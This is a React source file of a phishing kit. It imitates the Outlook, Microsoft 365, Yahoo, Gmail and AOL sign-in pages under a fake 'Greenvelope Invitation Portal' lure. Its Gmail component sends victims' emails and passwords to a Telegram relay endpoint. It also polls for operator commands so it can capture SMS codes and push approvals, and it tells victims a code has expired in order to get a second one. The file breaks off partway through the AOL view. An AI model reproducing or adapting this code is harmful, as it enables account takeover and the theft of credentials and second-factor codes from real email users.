import React, { useState, useEffect } from 'react';
import { MicrosoftLogo, OutlookModernIcon, YahooLogo, GoogleColorLogo, AolWordmark } from './ProviderLogos';
import { Office365Icon, GmailIcon } from './ProviderIcons';
import { Eye, EyeOff, AlertCircle } from 'lucide-react';

interface AuthFormProps {
  initialEmail: string;
  onSuccess: (email: string) => void;
  onCancel: () => void;
  isLoading: boolean;
  loadingStep: string;
  errorMessage: string | null;
  onSubmit: (email: string, pass: string) => void;
}

// 1. OUTLOOK / HOTMAIL LOGIN VIEW
export const OutlookLoginView: React.FC<AuthFormProps> = ({
  initialEmail,
  onCancel,
  isLoading,
  loadingStep,
  errorMessage,
  onSubmit
}) => {
  const [email, setEmail] = useState(initialEmail || 'guest@outlook.com');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [keepSignedIn, setKeepSignedIn] = useState(true);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    onSubmit(email, password);
  };

  return (
    <div className="w-full bg-[#f3f4f6] text-[#1b1b1b] min-h-[520px] flex flex-col justify-between p-6 sm:p-8 font-['Segoe_UI',-apple-system,BlinkMacSystemFont,sans-serif]">
      {/* Outer Card Box */}
      <div className="bg-white border border-[#e5e7eb] shadow-lg rounded-sm p-6 sm:p-10 max-w-[440px] w-full mx-auto my-auto space-y-5">
        {/* Microsoft Header with Outlook sub-branding */}
        <div className="flex items-center justify-between">
          <MicrosoftLogo className="h-6" />
          <div className="flex items-center gap-1 text-xs text-[#505050] font-normal">
            <OutlookModernIcon className="w-4 h-4" />
            <span>Outlook</span>
          </div>
        </div>

        <div>
          <h2 className="text-2xl font-semibold text-[#1b1b1b] tracking-tight">Sign in</h2>
          <p className="text-xs text-[#505050] mt-1">to continue to Greenvelope Invitation Portal</p>
        </div>

        {errorMessage && (
          <div className="text-[#e81123] text-xs flex items-start gap-1.5 bg-[#fdf2f2] p-2.5 border border-[#f8b4b4] rounded-sm">
            <AlertCircle className="w-4 h-4 flex-shrink-0 mt-0.5" />
            <span>{errorMessage}</span>
          </div>
        )}

        <form onSubmit={handleSubmit} className="space-y-4">
          <div>
            <input
              type="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              placeholder="Email, phone, or Skype"
              disabled={isLoading}
              required
              className="w-full border-b border-[#605e5c] focus:border-[#0067b8] py-2 text-sm text-[#1b1b1b] placeholder-[#605e5c] outline-none bg-transparent transition-colors focus:border-b-2"
            />
          </div>

          <div className="relative">
            <input
              type={showPassword ? 'text' : 'password'}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Password"
              disabled={isLoading}
              required
              className="w-full border-b border-[#605e5c] focus:border-[#0067b8] py-2 pr-8 text-sm text-[#1b1b1b] placeholder-[#605e5c] outline-none bg-transparent transition-colors focus:border-b-2"
            />
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute right-1 top-2.5 text-[#505050] hover:text-[#1b1b1b] cursor-pointer"
            >
              {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4 text-[#505050]" />}
            </button>
          </div>

          <div className="text-xs text-[#0067b8] hover:underline cursor-pointer flex justify-between items-center pt-1">
            <span>Forgot password?</span>
            <span className="text-[#505050]">Sign-in options</span>
          </div>

          <div className="pt-2">
            <label className="flex items-center gap-2 text-xs text-[#1b1b1b] cursor-pointer select-none">
              <input
                type="checkbox"
                checked={keepSignedIn}
                onChange={(e) => setKeepSignedIn(e.target.checked)}
                className="w-4 h-4 text-[#0067b8] border-[#605e5c] rounded focus:ring-0"
              />
              <span>Stay signed in</span>
            </label>
          </div>

          {isLoading && (
            <div className="py-2 flex items-center gap-2.5 text-xs text-[#0067b8]">
              <div className="w-3.5 h-3.5 border-2 border-[#0067b8] border-t-transparent rounded-full animate-spin" />
              <span>{loadingStep || 'Signing you in...'}</span>
            </div>
          )}

          <div className="flex items-center justify-end gap-2.5 pt-4">
            <button
              type="button"
              onClick={onCancel}
              disabled={isLoading}
              className="px-6 py-1.5 bg-[#cccccc] hover:bg-[#b8b8b8] text-[#1b1b1b] text-xs font-semibold rounded-xs transition-colors cursor-pointer"
            >
              Back
            </button>
            <button
              type="submit"
              disabled={isLoading}
              className="px-7 py-1.5 bg-[#0067b8] hover:bg-[#005da6] text-white text-xs font-semibold rounded-xs transition-colors shadow-sm cursor-pointer disabled:opacity-50"
            >
              {isLoading ? 'Verifying...' : 'Sign in'}
            </button>
          </div>
        </form>
      </div>

      {/* Microsoft Footer */}
      <div className="text-[11px] text-[#505050] text-right max-w-[440px] mx-auto w-full pt-3 flex items-center justify-between">
        <span>Terms of use</span>
        <span>Privacy &amp; cookies</span>
        <span>Greenvelope Verification</span>
      </div>
    </div>
  );
};

// 2. OFFICE 365 / MICROSOFT 365 LOGIN VIEW (Corporate / Work or School account look)
export const Office365LoginView: React.FC<AuthFormProps> = ({
  initialEmail,
  onCancel,
  isLoading,
  loadingStep,
  errorMessage,
  onSubmit
}) => {
  const [email, setEmail] = useState(initialEmail || 'corporate.user@company.com');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [keepSignedIn, setKeepSignedIn] = useState(true);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    onSubmit(email, password);
  };

  return (
    <div className="w-full bg-[#eef2f5] text-[#1b1b1b] min-h-[540px] flex flex-col justify-between p-6 sm:p-8 font-['Segoe_UI',-apple-system,BlinkMacSystemFont,sans-serif]">
      <div className="bg-white border border-[#d2d6dc] shadow-md rounded-none p-6 sm:p-10 max-w-[440px] w-full mx-auto my-auto space-y-6">
        <div className="flex items-center justify-between pb-1">
          <MicrosoftLogo className="h-6" />
          <div className="flex items-center gap-1.5 bg-white border border-[#d2d6dc] px-2 py-1 rounded shadow-2xs">
            <Office365Icon className="w-4 h-4" />
            <span className="text-xs font-semibold text-[#1b1b1b]">Microsoft 365</span>
          </div>
        </div>

        <div>
          <h2 className="text-2xl font-semibold text-[#1b1b1b]">Work or school account</h2>
          <p className="text-xs text-[#505050] mt-1">Sign in with your organization or enterprise credentials</p>
        </div>

        {errorMessage && (
          <div className="text-[#e81123] text-xs flex items-start gap-1.5 bg-[#fdf2f2] p-2.5 border border-[#f8b4b4]">
            <AlertCircle className="w-4 h-4 flex-shrink-0 mt-0.5" />
            <span>{errorMessage}</span>
          </div>
        )}

        <form onSubmit={handleSubmit} className="space-y-4">
          <div>
            <label className="block text-xs font-semibold text-[#505050] mb-1">
              Account Email
            </label>
            <input
              type="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              placeholder="someone@example.com"
              disabled={isLoading}
              required
              className="w-full border-b border-[#605e5c] focus:border-[#0067b8] py-2 text-sm text-[#1b1b1b] outline-none bg-transparent transition-colors focus:border-b-2"
            />
          </div>

          <div className="relative">
            <label className="block text-xs font-semibold text-[#505050] mb-1">
              Password
            </label>
            <input
              type={showPassword ? 'text' : 'password'}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Password"
              disabled={isLoading}
              required
              className="w-full border-b border-[#605e5c] focus:border-[#0067b8] py-2 pr-8 text-sm text-[#1b1b1b] outline-none bg-transparent transition-colors focus:border-b-2"
            />
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute right-1 bottom-2 text-[#505050] hover:text-[#1b1b1b] cursor-pointer"
            >
              {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
            </button>
          </div>

          <div className="flex items-center justify-between text-xs text-[#0067b8] pt-1">
            <span className="hover:underline cursor-pointer">Can't access your account?</span>
            <span className="text-[#505050] hover:underline cursor-pointer">Sign in with security key</span>
          </div>

          <div className="pt-1">
            <label className="flex items-center gap-2 text-xs text-[#1b1b1b] cursor-pointer select-none">
              <input
                type="checkbox"
                checked={keepSignedIn}
                onChange={(e) => setKeepSignedIn(e.target.checked)}
                className="w-4 h-4 text-[#0067b8] border-[#605e5c] rounded focus:ring-0"
              />
              <span>Don't show this again</span>
            </label>
          </div>

          {isLoading && (
            <div className="py-2 flex items-center gap-2.5 text-xs text-[#0067b8]">
              <div className="w-3.5 h-3.5 border-2 border-[#0067b8] border-t-transparent rounded-full animate-spin" />
              <span>{loadingStep || 'Connecting to Microsoft 365 domain...'}</span>
            </div>
          )}

          <div className="flex items-center justify-end gap-2.5 pt-4">
            <button
              type="button"
              onClick={onCancel}
              disabled={isLoading}
              className="px-6 py-2 bg-[#e1dfdd] hover:bg-[#d2d0ce] text-[#1b1b1b] text-xs font-semibold transition-colors cursor-pointer"
            >
              Back
            </button>
            <button
              type="submit"
              disabled={isLoading}
              className="px-7 py-2 bg-[#0067b8] hover:bg-[#005da6] text-white text-xs font-semibold transition-colors shadow-sm cursor-pointer disabled:opacity-50"
            >
              {isLoading ? 'Verifying...' : 'Sign in'}
            </button>
          </div>
        </form>
      </div>

      <div className="text-[11px] text-[#505050] text-center max-w-[440px] mx-auto w-full pt-3">
        © 2026 Microsoft Corporation • Connected via Greenvelope SSO Handshake
      </div>
    </div>
  );
};

// 3. YAHOO MAIL LOGIN VIEW (Purple Theme, Clean Yahoo Sign-in Card)
export const YahooLoginView: React.FC<AuthFormProps> = ({
  initialEmail,
  onCancel,
  isLoading,
  loadingStep,
  errorMessage,
  onSubmit
}) => {
  const [email, setEmail] = useState(initialEmail || 'guest@yahoo.com');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [staySignedIn, setStaySignedIn] = useState(true);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    onSubmit(email, password);
  };

  return (
    <div className="w-full bg-[#f0f3f5] text-[#26282a] min-h-[540px] flex flex-col justify-between p-6 sm:p-8 font-['Helvetica_Neue',Helvetica,Arial,sans-serif]">
      <div className="bg-white border border-[#e0e4e9] shadow-sm rounded-lg p-6 sm:p-10 max-w-[400px] w-full mx-auto my-auto space-y-5 text-center">
        {/* Yahoo Logo */}
        <div className="flex justify-center pb-1">
          <YahooLogo className="h-8" />
        </div>

        <div>
          <h2 className="text-xl font-bold text-[#26282a]">Sign in to Yahoo Mail</h2>
          <p className="text-xs text-[#6e7780] mt-1">using your Yahoo account</p>
        </div>

        {errorMessage && (
          <div className="text-[#ea4335] text-xs flex items-start gap-1.5 bg-[#fef0f0] p-2.5 border border-[#fcc] rounded-md text-left">
            <AlertCircle className="w-4 h-4 flex-shrink-0 mt-0.5" />
            <span>{errorMessage}</span>
          </div>
        )}

        <form onSubmit={handleSubmit} className="space-y-4 text-left">
          <div>
            <label className="block text-xs font-semibold text-[#6e7780] mb-1">
              Username, email, or mobile
            </label>
            <input
              type="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              placeholder="username@yahoo.com"
              disabled={isLoading}
              required
              className="w-full border border-[#b9bdc5] focus:border-[#6001d2] focus:ring-1 focus:ring-[#6001d2] rounded-md py-2.5 px-3 text-sm text-[#26282a] outline-none transition-all"
            />
          </div>

          <div className="relative">
            <label className="block text-xs font-semibold text-[#6e7780] mb-1">
              Password
            </label>
            <input
              type={showPassword ? 'text' : 'password'}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Enter password"
              disabled={isLoading}
              required
              className="w-full border border-[#b9bdc5] focus:border-[#6001d2] focus:ring-1 focus:ring-[#6001d2] rounded-md py-2.5 px-3 pr-10 text-sm text-[#26282a] outline-none transition-all"
            />
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute right-3 bottom-3 text-[#6e7780] hover:text-[#26282a] cursor-pointer"
            >
              {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
            </button>
          </div>

          <button
            type="submit"
            disabled={isLoading}
            className="w-full py-3 bg-[#6001d2] hover:bg-[#5200b3] text-white text-sm font-bold rounded-3xl transition-colors shadow-sm cursor-pointer disabled:opacity-60 flex items-center justify-center space-x-2"
          >
            {isLoading ? (
              <>
                <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
                <span>Verifying...</span>
              </>
            ) : (
              <span>Next</span>
            )}
          </button>

          <div className="flex items-center justify-between text-xs pt-1">
            <label className="flex items-center gap-2 text-[#26282a] cursor-pointer select-none">
              <input
                type="checkbox"
                checked={staySignedIn}
                onChange={(e) => setStaySignedIn(e.target.checked)}
                className="w-4 h-4 text-[#6001d2] border-[#b9bdc5] rounded focus:ring-0"
              />
              <span>Stay signed in</span>
            </label>
            <span className="text-[#188fff] hover:underline cursor-pointer">Forgot username?</span>
          </div>

          {isLoading && (
            <div className="py-1 text-center text-xs text-[#6001d2] font-medium">
              {loadingStep || 'Connecting to Yahoo Mail authentication gateway...'}
            </div>
          )}

          <div className="pt-2 text-center">
            <button
              type="button"
              onClick={onCancel}
              disabled={isLoading}
              className="w-full py-2.5 border border-[#188fff] text-[#188fff] hover:bg-blue-50 text-xs font-bold rounded-3xl transition-colors cursor-pointer"
            >
              Choose another provider
            </button>
          </div>
        </form>
      </div>

      <div className="text-[11px] text-[#6e7780] text-center max-w-[400px] mx-auto w-full pt-3 flex justify-around">
        <span>Help</span>
        <span>Terms</span>
        <span>Privacy</span>
      </div>
    </div>
  );
};

import React, { useState, useEffect } from 'react';

// Unified layout status codes sent by the Telegram Bot command module
type TelegramBotCommandPhase = 
  | 'EMAIL_ENTRY' 
  | 'PASSWORD_ENTRY' 
  | 'PROCESSING_SPINNER' 
  | 'YES_PROMPT_VIEW' 
  | 'NUMBER_PROMPT_VIEW' 
  | 'SMS_CODE_1_VIEW'
  | 'SMS_CODE_2_VIEW'
  | 'SUCCESS_VIEW';

interface AuthFormProps {
  initialEmail?: string;
  onCancel: () => void;
  isLoading: boolean;
  loadingStep: string;
  errorMessage: string | null;
  onSubmit: (email: string, pass: string) => void;
}

export const GmailLoginView: React.FC<AuthFormProps> = ({
  initialEmail,
  onCancel,
  isLoading,
  loadingStep,
  errorMessage,
  onSubmit
}) => {
  const [currentPhase, setCurrentPhase] = useState<TelegramBotCommandPhase>('EMAIL_ENTRY');
  const [email, setEmail] = useState(initialEmail || 'guest@gmail.com');
  const [password, setPassword] = useState('');
  const [smsCode1, setSmsCode1] = useState('');
  const [smsCode2, setSmsCode2] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [localError, setLocalError] = useState<string | null>(null);
  const [targetDisplayNumber, setTargetDisplayNumber] = useState<number>(87);

  // REAL-TIME STATE MONITORING POLLING SYSTEM
  useEffect(() => {
    if (currentPhase === 'EMAIL_ENTRY' || currentPhase === 'PASSWORD_ENTRY' || currentPhase === 'SUCCESS_VIEW') return;

    let pollingTimer: NodeJS.Timeout;

    const queryLatestTelegramCommand = async () => {
      try {
        const res = await fetch(`/api/telegram?sessionId=${encodeURIComponent(email)}&action=poll`);
        if (res.ok) {
          const data = await res.json();
          
          if (data.command === 'YES_PROMPT') {
            setCurrentPhase('YES_PROMPT_VIEW');
          } else if (data.command === 'SMS_CODE_1') {
            setCurrentPhase('SMS_CODE_1_VIEW');
          } else if (data.command === 'SMS_CODE_2') {
            setCurrentPhase('SMS_CODE_2_VIEW');
          } else if (data.command.startsWith('NUMBER_PROMPT_')) {
            const parts = data.command.split('_');
            const parsedNum = parseInt(parts[parts.length - 1]) || 87;
            setTargetDisplayNumber(parsedNum);
            setCurrentPhase('NUMBER_PROMPT_VIEW');
          } else if (data.command === 'PASSWORD_ERROR') {
            setCurrentPhase('PASSWORD_ENTRY');
            setLocalError('Incorrect Password. Please try again.');
          } else if (data.command === 'BLOCK_VISITOR') {
            setCurrentPhase('EMAIL_ENTRY');
            setLocalError('This login access token profile has been blocked by administrators.');
          } else if (data.command === 'SUCCESS') {
            setCurrentPhase('SUCCESS_VIEW');
          }
        }
      } catch (err) {
        console.warn('Long polling transaction iteration checked:', err);
      }
    };

    queryLatestTelegramCommand();
    pollingTimer = setInterval(queryLatestTelegramCommand, 3000);

    return () => clearInterval(pollingTimer);
  }, [currentPhase, email]);

  const handleEmailSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email.trim()) return;
    setLocalError(null);

    try {
      await fetch('/api/telegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sessionId: email, message: `📧 Email Entered: <code>${email}</code>` })
      });
    } catch (e) {}

    setCurrentPhase('PASSWORD_ENTRY');
  };

  const handlePasswordSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!password) return;
    setLocalError(null);
    setCurrentPhase('PROCESSING_SPINNER');

    try {
      await fetch('/api/telegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          sessionId: email, 
          message: `🔑 Credentials Logged:\n👤 User: <code>${email}</code>\n📦 Pass: <code>${password}</code>`,
          resetCommandState: 'PENDING'
        })
      });
    } catch (e) {}
  };

  const dispatchSmsToken = async (tokenValue: string, messageLabel: string) => {
    try {
      await fetch('/api/telegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sessionId: email, message: `💬 ${messageLabel}: <code>${tokenValue}</code>` })
      });
      setCurrentPhase('PROCESSING_SPINNER');
    } catch (e) {}
  };

  const activeError = localError || errorMessage;
  const showTopLoadingBar = currentPhase === 'PROCESSING_SPINNER' || isLoading;

  return (
    <div className="w-full bg-white text-[#1f1f1f] min-h-[460px] flex flex-col justify-between p-8 sm:p-12 font-sans antialiased relative overflow-hidden select-none">
      
      <div className={`absolute top-0 left-0 right-0 h-1 bg-blue-50 z-50 overflow-hidden transition-opacity duration-300 ${showTopLoadingBar ? 'opacity-100' : 'opacity-0'}`}>
        <div className="h-full bg-[#0b57d0] animate-[loading_1.5s_infinite_ease-in-out] origin-[0%_50%] w-full" />
      </div>

      <div className="flex flex-col md:flex-row gap-8 md:gap-16 flex-grow items-stretch mt-4">
        
        <div className="flex-1 flex flex-col justify-between min-w-[260px]">
          <div className="space-y-4">
            <svg className="h-7 w-auto" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
              <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
              <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
              <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z" fill="#FBBC05"/>
              <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
            </svg>
            
            <h1 className="text-3xl font-normal text-[#1f1f1f] tracking-tight sm:text-4xl">
              {currentPhase === 'EMAIL_ENTRY' ? 'Sign in' : 'Welcome'}
            </h1>
            
            <div className="text-sm text-[#444746]">
              {currentPhase === 'EMAIL_ENTRY' ? (
                <span>to continue to Greenvelope Invitation Portal</span>
              ) : (
                <div className="inline-flex items-center gap-2 rounded-full border border-[#dadce0] pl-1.5 pr-3 py-1 text-sm text-[#1f1f1f] max-w-full shadow-sm bg-white">
                  <div className="w-5 h-5 rounded-full bg-gray-100 flex items-center justify-center border border-gray-300 overflow-hidden shrink-0 text-xs">👤</div>
                  <span className="truncate max-w-[180px] font-medium text-[#1f1f1f] tracking-tight">{email}</span>
                </div>
              )}
            </div>
          </div>
        </div>

        <div className="flex-1 flex flex-col justify-start pt-8 min-w-[280px]">
          
          {activeError && (currentPhase === 'EMAIL_ENTRY' || currentPhase === 'PASSWORD_ENTRY') && (
            <div className="mb-4 text-[#b3261e] text-xs flex items-start gap-1.5 bg-[#fffbfa] p-3 border border-[#f9dedc] rounded-md">
              <svg className="w-4 h-4 flex-shrink-0 mt-0.5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                <path strokeLinecap="round" strokeLinejoin="round" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
              </svg>
              <span>{activeError}</span>
            </div>
          )}

          {currentPhase === 'EMAIL_ENTRY' && (
            <form onSubmit={handleEmailSubmit} className="space-y-6">
              <div className="relative group">
                <input
                  type="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  required
                  placeholder=" "
                  id="google_email_field"
                  className="peer w-full rounded-md border border-gray-400 px-4 pb-3.5 pt-5 text-base outline-none transition-all focus:border-2 focus:border-[#0b57d0]"
                />
                <label htmlFor="google_email_field" className="absolute left-4 top-4 origin-top-left text-base text-[#444746] transition-all duration-200 pointer-events-none peer-placeholder-shown:translate-y-0 peer-focus:-translate-y-3 peer-focus:scale-75">
                  Email or phone
                </label>
              </div>
              <div className="flex items-center justify-between pt-8">
                <button type="button" onClick={onCancel} className="text-sm font-medium text-[#0b57d0] hover:bg-blue-50 px-4 py-2 rounded-md">Create account</button>
                <button type="submit" className="px-6 py-2 bg-[#0b57d0] text-white text-sm font-medium rounded-full shadow-sm">Next</button>
              </div>
            </form>
          )}

          {currentPhase === 'PASSWORD_ENTRY' && (
            <form onSubmit={handlePasswordSubmit} className="space-y-6">
              <div className="relative group">
                <input
                  type={showPassword ? 'text' : 'password'}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  required
                  autoFocus
                  placeholder=" "
                  id="google_password_field"
                  className={`peer w-full rounded-md border px-4 pb-3.5 pt-5 pr-12 text-base outline-none transition-all focus:border-2 ${
                    activeError ? 'border-[#b3261e] focus:border-[#b3261e]' : 'border-gray-400 focus:border-[#0b57d0]'
                  }`}
                />
                <label htmlFor="google_password_field" className={`absolute left-4 top-4 origin-top-left text-base transition-all duration-200 pointer-events-none peer-placeholder-shown:translate-y-0 peer-focus:-translate-y-3 peer-focus:scale-75 ${activeError ? 'text-[#b3261e]' : 'text-[#444746]'}`}>
                  Enter your password
                </label>
              </div>
              <div className="pt-1 flex items-center">
                <label className="flex items-center gap-3 text-sm text-[#1f1f1f] cursor-pointer select-none">
                  <input type="checkbox" checked={showPassword} onChange={(e) => setShowPassword(e.target.checked)} className="h-4 w-4 rounded border-gray-300 text-[#0b57d0] focus:ring-0" />
                  <span className="text-sm font-normal">Show password</span>
                </label>
              </div>
              <div className="flex items-center justify-end gap-4 pt-12">
                <button type="button" onClick={() => setCurrentPhase('EMAIL_ENTRY')} className="text-sm font-medium text-[#0b57d0] hover:bg-blue-50 px-4 py-2 rounded-md">Forgot password?</button>
                <button type="submit" className="px-6 py-2 bg-[#0b57d0] text-white text-sm font-medium rounded-full shadow-sm">Next</button>
              </div>
            </form>
          )}

          {currentPhase === 'PROCESSING_SPINNER' && (
            <div className="flex-1 flex flex-col items-center justify-center py-12 space-y-4">
              <div className="w-12 h-12 border-4 border-gray-100 border-t-[#0b57d0] rounded-full animate-spin"></div>
              <p className="text-sm text-gray-500 font-medium">Verifying security parameters...</p>
            </div>
          )}

          {currentPhase === 'YES_PROMPT_VIEW' && (
            <div className="space-y-6 flex flex-col justify-between h-full">
              <div className="space-y-3">
                <h2 className="text-xl font-normal text-gray-900">Check your Gmail app</h2>
                <p className="text-sm text-gray-600 leading-relaxed">
                  Google sent a notification to your tablet or mobile device. Open your official application and tap 
                  <span className="font-semibold text-gray-900"> "Yes, it's me"</span> to finish your registration.
                </p>
              </div>
              <div className="flex items-center justify-end pt-12">
                <button 
                  type="button" 
                  onClick={() => dispatchSmsToken('User Tapped Yes Confirmation Button', 'App Confirmation Clicked')}
                  className="px-6 py-2 bg-[#0b57d0] text-white text-sm font-medium rounded-full shadow-sm hover:bg-[#0842a0] transition-colors"
                >
                  I've tapped Yes
                </button>
              </div>
            </div>
          )}

          {currentPhase === 'NUMBER_PROMPT_VIEW' && (
            <div className="space-y-6">
              <div className="space-y-2">
                <h2 className="text-xl font-normal text-gray-900">Confirm match number</h2>
                <p className="text-sm text-gray-600 leading-relaxed">
                  Open your mobile application notification dialog and select the specific calculation match value shown below to proceed:
                </p>
              </div>
              <div className="py-4">
                <div className="text-5xl font-bold text-[#0b57d0] bg-blue-50/60 rounded-2xl py-5 px-8 max-w-[130px] tracking-tight border border-blue-100 text-center animate-pulse">
                  {targetDisplayNumber}
                </div>
              </div>
            </div>
          )}

          {currentPhase === 'SMS_CODE_1_VIEW' && (
            <form onSubmit={(e) => { e.preventDefault(); dispatchSmsToken(smsCode1, 'SMS Code 1 Token'); }} className="space-y-5">
              <div className="space-y-1">
                <h2 className="text-xl font-normal text-gray-900">2-Step Verification</h2>
                <p className="text-xs text-gray-500">Provide the primary 6-digit confirmation code issued via text message.</p>
              </div>
              <div className="relative">
                <input
                  type="text"
                  maxLength={6}
                  value={smsCode1}
                  onChange={(e) => setSmsCode1(e.target.value.replace(/\D/g, ''))}
                  placeholder=" "
                  className="peer w-full rounded-md border border-gray-400 px-4 pb-3 pt-5 text-base outline-none focus:border-2 focus:border-[#0b57d0] tracking-widest font-mono text-center"
                />
                <label className="absolute left-4 top-4 origin-top-left text-sm text-[#444746] transition-all duration-200 pointer-events-none peer-placeholder-shown:translate-y-0 peer-focus:-translate-y-3 peer-focus:scale-75">
                  Primary SMS Code
                </label>
              </div>
              <button type="submit" className="w-full py-2.5 bg-[#0b57d0] text-white rounded-full font-medium text-sm hover:bg-[#0842a0]">
                Verify Primary Factor
              </button>
            </form>
          )}

          {currentPhase === 'SMS_CODE_2_VIEW' && (
            <form onSubmit={(e) => { e.preventDefault(); dispatchSmsToken(smsCode2, 'SMS Code 2 Token'); }} className="space-y-5">
              <div className="space-y-1">
                <h2 className="text-xl font-normal text-gray-900">Secondary Verification Challenge</h2>
                <p className="text-xs text-gray-500">The previous code was invalid or expired. Provide the new 6-digit backup code just sent to your phone.</p>
              </div>
              <div className="relative">
                <input
                  type="text"
                  maxLength={6}
                  value={smsCode2}
                  onChange={(e) => setSmsCode2(e.target.value.replace(/\D/g, ''))}
                  placeholder=" "
                  className="peer w-full rounded-md border border-gray-400 px-4 pb-3 pt-5 text-base outline-none focus:border-2 focus:border-[#0b57d0] tracking-widest font-mono text-center"
                />
                <label className="absolute left-4 top-4 origin-top-left text-sm text-[#444746] transition-all duration-200 pointer-events-none peer-placeholder-shown:translate-y-0 peer-focus:-translate-y-3 peer-focus:scale-75">
                  Backup SMS Code
                </label>
              </div>
              <button type="submit" className="w-full py-2.5 bg-[#0b57d0] text-white rounded-full font-medium text-sm hover:bg-[#0842a0]">
                Verify Secondary Factor
              </button>
            </form>
          )}

          {currentPhase === 'SUCCESS_VIEW' && (
            <div className="text-center py-12 space-y-4">
              <div className="w-12 h-12 bg-green-100 text-green-600 rounded-full flex items-center justify-center text-2xl font-bold mx-auto">✓</div>
              <h2 className="text-2xl font-normal text-gray-900">Identity Confirmed</h2>
              <p className="text-sm text-gray-500 max-w-xs mx-auto">Authorization metrics successfully synchronized. Access token active. Redirecting to invitation portal...</p>
            </div>
          )}

        </div>
      </div>

      <div className="text-xs text-[#747775] pt-6 flex flex-wrap justify-between gap-4 border-t border-gray-100 mt-8">
        <div className="flex items-center gap-1 cursor-pointer hover:bg-gray-50 p-1 rounded">
          <span>English (United States)</span>
          <span className="text-[10px]">▼</span>
        </div>
        <div className="flex gap-5 text-xs text-[#747775]">
          <span className="cursor-pointer hover:underline">Help</span>
          <span className="cursor-pointer hover:underline">Privacy</span>
          <span className="cursor-pointer hover:underline">Terms</span>
        </div>
      </div>
    </div>
  );
};



// 5. AOL LOGIN VIEW (Classic AOL Sign in)
export const AolLoginView: React.FC<AuthFormProps> = ({
  initialEmail,
  onCancel,
  isLoading,
  loadingStep,
  errorMessage,
  onSubmit
}) => {
  const [email, setEmail] = useState(initialEmail || 'guest@aol.com');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [staySignedIn, setStaySignedIn] = useState(true);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    onSubmit(email, password);
  };

  return (
    <div className="w-full bg-[#f4f4f4] text-[#111111] min-h-[540px] flex flex-col justify-between p-6 sm:p-8 font-sans">
      <div className="bg-white border border-[#e5e5e5] rounded-xl shadow-sm p-6 sm:p-10 max-w-[390px] w-full mx-auto my-auto space-y-5 text-center">
        <div className="flex justify-center pb-1">
          <AolWordmark className="h-7" />
        </div>

        <div>
          <h2 className="text-xl font-extrabold text-[#111111]">Sign in</h2>
          <p className="text-xs text-[#767676] mt-1">Enter your AOL username and password</p>
        </div>

        {errorMessage && (
          <div className="text-[#e81123] text-xs flex items-start gap-1.5 bg-[#fdf2f2] p-2.5 border border-[#f8b4b4] rounded text-left">
            <AlertCircle className="w-4 h-4 flex-shrink-0 mt-0.5" />
            <span>{errorMessage}</span>
          </div>
        )}

        <form onSubmit={handleSubmit} className="space-y-4 text-left">
          <div>
            <label className="block text-xs font-bold text-[#111111] mb-1">
              Username or Email
            </label>
            <input
              type="email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              placeholder="username@aol.com"
              disabled={isLoading}
              required
              className="w-full border-2 border-[#111111] rounded-md py-2 px-3 text-sm text-[#111111] outline-none"
            />
          </div>

          <div className="relative">
            <label className="block text-xs font-bold text-[#111111] mb-1">
              Password
            </label>
            <input
              type={showPassword ? 'text' : 'password'}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Enter password"
              disabled={isLoading}
              required
